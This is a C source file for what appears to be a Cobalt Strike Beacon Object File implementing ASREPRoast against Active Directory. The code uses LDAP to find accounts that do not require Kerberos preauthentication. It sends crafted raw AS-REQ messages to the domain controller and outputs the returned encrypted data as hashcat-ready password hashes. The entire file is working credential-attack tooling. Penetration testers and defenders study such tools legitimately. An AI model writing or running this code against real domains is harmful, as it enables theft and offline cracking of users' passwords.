#include "asreproast.h"
#include "krb5.h"
#include "bofdefs.h"
#include "common.h"
#include <winldap.h>

/*
 * ASREPRoast — request an AS-REP (without preauthentication) from the KDC and
 * emit the encrypted enc-part as a crackable hash.
 *
 * ASREPRoast is fundamentally different from Kerberoasting: it does NOT use
 * LSA (there is no AS-REP LSA primitive) — it crafts a raw AS-REQ and sends
 * it directly to the KDC over UDP:88 (TCP fallback on truncation).
 *
 * Modes (dispatched from entry.c):
 *   username == NULL/empty -> enumerate roastable users via LDAP, roast each
 *   username != NULL        -> roast that one account
 *   etype                   -> requested enctype (23 RC4 default, 17 AES128, 18 AES256)
 *
 * Hash format (hashcat):
 *   RC4 (23)  -> mode 18200: $krb5asrep$23$user@realm:<first16>$<rest>
 *   AES (17/18) -> 32100/32200: $krb5asrep$<e>$user$REALM$<first16>$<rest>
 *
 * OUTPUT: buffered via bprintf(), flushed in ONE BeaconOutput.
 */

/* MSVCRT$vsnprintf is not in the vendored bofdefs.h. */
WINBASEAPI int __cdecl MSVCRT$vsnprintf(char* d, size_t n, const char* fmt, va_list arg);

#define OUTBUFSIZE 65536

static char* g_out    = (char*)1;
static int   g_outLen = 1;

static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1)
        g_out[0] = '\0';
}

static void bprintf(const char* fmt, ...)
{
    va_list ap;
    char    tmp[2048];
    int     n, remaining, toCopy;
    if (g_out == NULL || g_out == (char*)1) return;
    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n <= 0) return;
    if (n >= (int)sizeof(tmp)) n = (int)sizeof(tmp) - 1;
    if (g_outLen + n >= OUTBUFSIZE) bflush();
    remaining = OUTBUFSIZE - g_outLen - 1;
    toCopy    = (n < remaining) ? n : remaining;
    MSVCRT$memcpy(g_out + g_outLen, tmp, (size_t)toCopy);
    g_outLen += toCopy;
    g_out[g_outLen] = '\0';
}

/* ---- LDAP (reuse the kerberoast pattern) ---- */
WINBASEAPI LDAP*        LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_set_option(LDAP* ld, int option, const void* invalue);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_bind_s(LDAP* ld, const PSTR dn, const PCHAR cred, ULONG method);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_search_s(LDAP* ld, const PSTR base, ULONG scope, const PSTR filter, PSTR attrs[], ULONG attrsonly, LDAPMessage** res);
WINBASEAPI LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
WINBASEAPI LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP* ld, LDAPMessage* entry);
WINBASEAPI PCHAR*       LDAPAPI WLDAP32$ldap_get_values(LDAP* ld, LDAPMessage* entry, const PSTR attr);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_value_free(PCHAR* vals);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage* res);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_unbind(LDAP* ld);

/* ---- KDC transport globals (one-shot init) ---- */
static BOOL   g_wsaInited = FALSE;
static char   g_kdcIp[64];
static char   g_realm[256];   /* DNS realm, UPPERCASE */
static int    g_etype = 23;

/* ---- domain context resolution ---- */
static void ResolveDomain(void)
{
    PDOMAIN_CONTROLLER_INFOA pdc = NULL;
    g_kdcIp[0] = '\0';
    g_realm[0] = '\0';

    if (NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdc) == ERROR_SUCCESS && pdc) {
        /* DomainControllerAddress is a dotted-quad string (no \\ prefix). */
        const char* addr = pdc->DomainControllerAddress;
        if (addr && addr[0] == '\\' && addr[1] == '\\') addr += 2;
        int i = 0;
        for (; addr && addr[i] && i < (int)sizeof(g_kdcIp) - 1; i++) g_kdcIp[i] = addr[i];
        g_kdcIp[i] = '\0';

        const char* dn = pdc->DomainName; /* DNS name, e.g. halcyon.local */
        i = 0;
        for (; dn && dn[i] && i < (int)sizeof(g_realm) - 1; i++) {
            char c = dn[i];
            if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
            g_realm[i] = c;
        }
        g_realm[i] = '\0';

        NETAPI32$NetApiBufferFree(pdc);
    }
}

/* ---- principal-name helpers ---- */
static void InitPrincipal(KERB_PRINCIPAL_NAME* pn, int nameType, const char* name)
{
    pn->name_type = nameType;
    pn->name_string = (PKERB_PRINCIPAL_NAME_name_string)MSVCRT$calloc(sizeof(KERB_PRINCIPAL_NAME_name_string_Element), 1);
    if (pn->name_string) {
        pn->name_string->next = NULL;
        pn->name_string->value = (char*)name;
    }
}

/* Build NT-SRV-INST (name-type 2) as TWO name_string components:
   "krbtgt" and "<REALM>". The '/' is NOT literal in the wire encoding —
   a single "krbtgt/REALM" string causes KDC_ERR_S_PRINCIPAL_UNKNOWN. */
static void InitSrvInstPrincipal(KERB_PRINCIPAL_NAME* pn, const char* svc, const char* host)
{
    pn->name_type = 2; /* NT-SRV-INST */
    pn->name_string = (PKERB_PRINCIPAL_NAME_name_string)MSVCRT$calloc(sizeof(KERB_PRINCIPAL_NAME_name_string_Element), 1);
    if (!pn->name_string) return;
    pn->name_string->next = NULL;
    pn->name_string->value = (char*)svc;

    pn->name_string->next = (PKERB_PRINCIPAL_NAME_name_string)MSVCRT$calloc(sizeof(KERB_PRINCIPAL_NAME_name_string_Element), 1);
    if (pn->name_string->next) {
        pn->name_string->next->next = NULL;
        pn->name_string->next->value = (char*)host;
    }
}

/* ---- raw AS-REQ build + send ---- */
static int DoAsRepRequest(const char* username, PUCHAR* asrepOut, ULONG* asrepSize)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in dst;
    int i, r;
    PUCHAR req = NULL, resp = NULL;
    ULONG reqSize = 0;
    KERBERR kerbErr;

    *asrepOut = NULL;
    *asrepSize = 0;

    if (!g_wsaInited) {
        if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            bprintf("[!] WSAStartup failed\n");
            return -1;
        }
        g_wsaInited = TRUE;
    }

    /* TCP, not UDP: the AS-REP for AES-enabled accounts exceeds a single
       UDP datagram, so UDP yields KRB_ERR_RESPONSE_TOO_BIG (52). Rubeus's
       Networking.SendBytes is TCP-only; mirror it. */
    s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        bprintf("[!] socket() failed: %d\n", WS2_32$WSAGetLastError());
        return -1;
    }

    /* Build the AS-REQ */
    {
        ASN1module_t module = KRB5_Module_Startup();
        if (module == NULL) { WS2_32$closesocket(s); bprintf("[!] KRB5 module startup failed\n"); return -1; }

        KERB_KDC_REQ kreq;
        KERB_KDC_REQ_BODY body;
        KERB_PRINCIPAL_NAME cname, sname;
        PKERB_INT32_list etypeNode;
        ASN1generalizedtime_t till = {0};

        MSVCRT$memset(&kreq, 0, sizeof(kreq));
        MSVCRT$memset(&body, 0, sizeof(body));
        MSVCRT$memset(&cname, 0, sizeof(cname));
        MSVCRT$memset(&sname, 0, sizeof(sname));

        InitPrincipal(&cname, 1 /* NT-PRINCIPAL */, (char*)username);
        InitSrvInstPrincipal(&sname, "krbtgt", g_realm);

        /* kdc-options: 0x40800010 = forwardable | renewable | renewable-ok.
           The encoder (ASN1Enc_KERB_KDC_REQ_BODY in krb5.c) hardcodes this
           bitstring and ignores body.kdc_options; canonicalize (0x00010000)
           is deliberately NOT set because it makes the KDC reject a bare
           sAMAccountName. */
        body.kdc_options.value = NULL;
        body.kdc_options.length = 0;
        body.cname = cname;
        body.realm = g_realm;
        body.sname = sname;
        body.till.year = 2037; body.till.month = 9; body.till.day = 13;
        body.till.hour = 2; body.till.minute = 48; body.till.second = 5;
        body.till.universal = 1; body.till.diff = 0;
        body.nonce = 0x12345678; /* fixed nonce is fine for ASREPRoast */
        etypeNode = (PKERB_INT32_list)MSVCRT$calloc(sizeof(PKERB_INT32_list_Element), 1);
        etypeNode->next = NULL;
        etypeNode->value = g_etype;
        body.etype = etypeNode;

        /* optional-field presence bits */
        body.o[0] = kdc_req_body_cname_present | kdc_req_body_sname_present;

        kreq.pvno = 5;
        kreq.msg_type = 10; /* AS-REQ */
        kreq.padata = NULL;
        kreq.req_body = body;

        kerbErr = KerbPackData(module, &kreq, KERB_KDC_REQ_PDU, &reqSize, &req);
        if (!KERB_SUCCESS(kerbErr) || !req || reqSize == 0) {
            bprintf("[!] Failed to encode AS-REQ (0x%x)\n", kerbErr);
            KRB5_Module_Cleanup(module);
            WS2_32$closesocket(s);
            return -1;
        }

        KRB5_Module_Cleanup(module);
        /* NOTE: KerbPackData allocates with LocalAlloc; free with LocalFree */
    }

    /* send over TCP:88 with a 4-byte big-endian length prefix
       (RFC 4120 7.2.2) */
    MSVCRT$memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = WS2_32$htons(88);
    dst.sin_addr.s_addr = WS2_32$inet_addr(g_kdcIp);
    if (dst.sin_addr.s_addr == INADDR_NONE) {
        bprintf("[!] Invalid KDC address: %s\n", g_kdcIp);
        KERNEL32$LocalFree(req);
        WS2_32$closesocket(s);
        return -1;
    }

    if (WS2_32$connect(s, (const struct sockaddr*)&dst, sizeof(dst)) == SOCKET_ERROR) {
        bprintf("[!] connect to %s:88 failed: %d\n", g_kdcIp, WS2_32$WSAGetLastError());
        KERNEL32$LocalFree(req);
        WS2_32$closesocket(s);
        return -1;
    }

    {
        unsigned char hdr[4];
        char* frame = (char*)MSVCRT$calloc(4 + (size_t)reqSize, 1);
        if (!frame) {
            KERNEL32$LocalFree(req);
            WS2_32$closesocket(s);
            return -1;
        }
        hdr[0] = (unsigned char)(reqSize >> 24);
        hdr[1] = (unsigned char)(reqSize >> 16);
        hdr[2] = (unsigned char)(reqSize >> 8);
        hdr[3] = (unsigned char)(reqSize);
        MSVCRT$memcpy(frame, hdr, 4);
        MSVCRT$memcpy(frame + 4, req, (size_t)reqSize);
        r = WS2_32$send(s, frame, 4 + (int)reqSize, 0);
        MSVCRT$free(frame);
        if (r == SOCKET_ERROR || r != 4 + (int)reqSize) {
            bprintf("[!] send failed (r=%d): %d\n", r, WS2_32$WSAGetLastError());
            KERNEL32$LocalFree(req);
            WS2_32$closesocket(s);
            return -1;
        }
    }

    {
        unsigned char mark[4];
        ULONG recSize;
        int got = 0;
        while (got < 4) {
            r = WS2_32$recv(s, (char*)mark + got, 4 - got, 0);
            if (r == SOCKET_ERROR || r <= 0) {
                bprintf("[!] recv (record mark) failed/timeout: %d\n", WS2_32$WSAGetLastError());
                KERNEL32$LocalFree(req);
                WS2_32$closesocket(s);
                return -1;
            }
            got += r;
        }
        recSize = ((ULONG)mark[0] << 24) | ((ULONG)mark[1] << 16) | ((ULONG)mark[2] << 8) | (ULONG)mark[3];
        recSize &= 0x7FFFFFFF; /* drop reserved high bit, mirroring Rubeus */
        if (recSize == 0 || recSize > 1024 * 1024) {
            bprintf("[!] Bad KDC response record size: %lu\n", recSize);
            KERNEL32$LocalFree(req);
            WS2_32$closesocket(s);
            return -1;
        }

        resp = (PUCHAR)MSVCRT$calloc(recSize, 1);
        if (!resp) {
            KERNEL32$LocalFree(req);
            WS2_32$closesocket(s);
            return -1;
        }
        got = 0;
        while (got < (int)recSize) {
            r = WS2_32$recv(s, (char*)resp + got, (int)recSize - got, 0);
            if (r == SOCKET_ERROR || r <= 0) {
                bprintf("[!] recv (body) failed/timeout: %d\n", WS2_32$WSAGetLastError());
                MSVCRT$free(resp);
                KERNEL32$LocalFree(req);
                WS2_32$closesocket(s);
                return -1;
            }
            got += r;
        }

        *asrepOut = resp;
        *asrepSize = recSize;
    }

    KERNEL32$LocalFree(req);
    WS2_32$closesocket(s);
    return 0;
}

/* ---- KRB-ERROR decode + friendly error codes ---- */
static const char* KdcErrName(int code)
{
    switch (code) {
        case 6:  return "KDC_ERR_C_PRINCIPAL_UNKNOWN";
        case 7:  return "KDC_ERR_S_PRINCIPAL_UNKNOWN";
        case 13: return "KDC_ERR_BADOPTION";
        case 14: return "KDC_ERR_ETYPE_NOSUPP";
        case 24: return "KDC_ERR_PREAUTH_FAILED";
        case 25: return "KDC_ERR_PREAUTH_REQUIRED";
        case 52: return "KRB_ERR_RESPONSE_TOO_BIG";
        default: return "UNKNOWN";
    }
}

static void EmitKrbError(PUCHAR data, ULONG size)
{
    ASN1module_t module = KRB5_Module_Startup();
    if (module == NULL) { bprintf("[!] KRB5 module startup failed\n"); return; }

    KERB_ERROR* err = NULL;
    KERBERR kerbErr = KerbUnpackData(module, data, size, KERB_ERROR_PDU, (PVOID*)&err);
    if (!KERB_SUCCESS(kerbErr) || err == NULL) {
        bprintf("[!] Failed to unpack KRB-ERROR (0x%x)\n", kerbErr);
        KRB5_Module_Cleanup(module);
        return;
    }

    bprintf("[!] KDC error %d (%s)", err->error_code, KdcErrName(err->error_code));
    if (err->o[0] & 0x01 && err->e_text && err->e_text[0]) {
        bprintf(": %s", err->e_text);
    }
    bprintf("\n");

    if (err->error_code == 25)
        bprintf("    -> account does not have 'Do not require Kerberos preauthentication' set\n");
    else if (err->error_code == 14 || err->error_code == 33)
        bprintf("    -> etype unsupported; retry with --etype 18 (AES256) or --etype 17 (AES128)\n");

    KerbFreeData(module, KERB_ERROR_PDU, err);
    KRB5_Module_Cleanup(module);
}

/* ---- AS-REP parse -> hash output ---- */
static void EmitAsrepHash(PUCHAR data, ULONG size, const char* username)
{
    /* AS-REP = [APPLICATION 11] -> first byte 0x6b; KRB-ERROR = [APPLICATION 30] -> 0x7e */
    if (size > 0 && data[0] == 0x7e) {
        EmitKrbError(data, size);
        return;
    }

    ASN1module_t module = KRB5_Module_Startup();
    if (module == NULL) { bprintf("[!] KRB5 module startup failed\n"); return; }

    KERB_KDC_REP* rep = NULL;
    KERBERR kerbErr = KerbUnpackData(module, data, size, KERB_KDC_REP_PDU, (PVOID*)&rep);
    if (!KERB_SUCCESS(kerbErr) || rep == NULL) {
        bprintf("[!] Failed to unpack AS-REP (0x%x)\n", kerbErr);
        KRB5_Module_Cleanup(module);
        return;
    }

    int etype = rep->enc_part.encryption_type;
    int ctSize = rep->enc_part.cipher_text.length;
    UCHAR* ct = rep->enc_part.cipher_text.value;

    if (ct == NULL || ctSize < 16) {
        bprintf("[!] AS-REP enc-part missing/short (%d bytes)\n", ctSize);
        KerbFreeData(module, KERB_KDC_REP_PDU, rep);
        KRB5_Module_Cleanup(module);
        return;
    }

    if (etype == 23) {
        /* mode 18200 */
        bprintf("$krb5asrep$23$%s@%s:", username, g_realm);
        for (int i = 0; i < ctSize; i++) {
            if (i == 16) bprintf("$");
            bprintf("%.2x", ct[i]);
        }
        bprintf("\n");
    } else if (etype == 17 || etype == 18) {
        /* mode 32100 / 32200 */
        bprintf("$krb5asrep$%d$%s$%s$", etype, username, g_realm);
        for (int i = 0; i < ctSize; i++) {
            if (i == 16) bprintf("$");
            bprintf("%.2x", ct[i]);
        }
        bprintf("\n");
    } else {
        bprintf("[!] Unsupported AS-REP etype %d (KDC ignored our etype request)\n", etype);
    }

    KerbFreeData(module, KERB_KDC_REP_PDU, rep);
    KRB5_Module_Cleanup(module);
}

/* ---- LDAP enumeration of roastable users ---- */
static void RoastViaLdap(void)
{
    /* reuse the get_asrep filter: UF_DONT_REQUIRE_PREAUTH = 0x400000 */
    const char* filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
    PCHAR attrs[2] = { "sAMAccountName", NULL };

    /* get base DN from rootDSE defaultNamingContext */
    LDAP* ld = WLDAP32$ldap_init(NULL, 389);
    if (!ld) { bprintf("[!] ldap_init failed\n"); return; }
    ULONG version = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        bprintf("[!] LDAP bind failed\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    char baseDn[512] = {0};
    {
        LDAPMessage* res = NULL;
        PCHAR dattrs[2] = { "defaultNamingContext", NULL };
        if (WLDAP32$ldap_search_s(ld, NULL, LDAP_SCOPE_BASE, "(objectclass=*)", dattrs, 0, &res) == LDAP_SUCCESS) {
            LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
            if (e) {
                PCHAR* vals = WLDAP32$ldap_get_values(ld, e, "defaultNamingContext");
                if (vals && vals[0]) {
                    int i = 0;
                    for (; vals[0][i] && i < (int)sizeof(baseDn) - 1; i++) baseDn[i] = vals[0][i];
                    baseDn[i] = '\0';
                    WLDAP32$ldap_value_free(vals);
                }
            }
            WLDAP32$ldap_msgfree(res);
        }
    }
    if (!baseDn[0]) { bprintf("[!] Could not read defaultNamingContext\n"); WLDAP32$ldap_unbind(ld); return; }

    LDAPMessage* res = NULL;
    if (WLDAP32$ldap_search_s(ld, baseDn, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res) != LDAP_SUCCESS) {
        bprintf("[!] LDAP search failed\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    int count = 0;
    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, res);
    while (entry) {
        PCHAR* sams = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
        if (sams && sams[0]) {
            bprintf("\n[*] Roasting %s\n", sams[0]);
            PUCHAR asrep = NULL; ULONG asrepSize = 0;
            if (DoAsRepRequest(sams[0], &asrep, &asrepSize) == 0) {
                EmitAsrepHash(asrep, asrepSize, sams[0]);
                MSVCRT$free(asrep);
                count++;
            }
        }
        if (sams) WLDAP32$ldap_value_free(sams);
        entry = WLDAP32$ldap_next_entry(ld, entry);
    }
    bprintf("\n[*] Roasted %d account(s)\n", count);

    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_unbind(ld);
}

void execute_asreproast(WCHAR** dispatch, char* username, int etype)
{
    g_out    = (char*)MSVCRT$calloc(OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    g_etype = (etype == 17 || etype == 18 || etype == 23) ? etype : 23;

    ResolveDomain();
    if (!g_kdcIp[0] || !g_realm[0]) {
        bprintf("[!] Could not resolve domain controller / realm\n");
        goto done;
    }

    bprintf("=== ASREPRoast ===\n");
    bprintf("[*] KDC: %s  Realm: %s  etype: %d\n\n", g_kdcIp, g_realm, g_etype);

    if (username && username[0]) {
        bprintf("[*] Roasting %s\n", username);
        PUCHAR asrep = NULL; ULONG asrepSize = 0;
        if (DoAsRepRequest(username, &asrep, &asrepSize) == 0) {
            EmitAsrepHash(asrep, asrepSize, username);
            MSVCRT$free(asrep);
        }
    } else {
        RoastViaLdap();
    }

done:
    bflush();
    if (g_out && g_out != (char*)1)
        MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
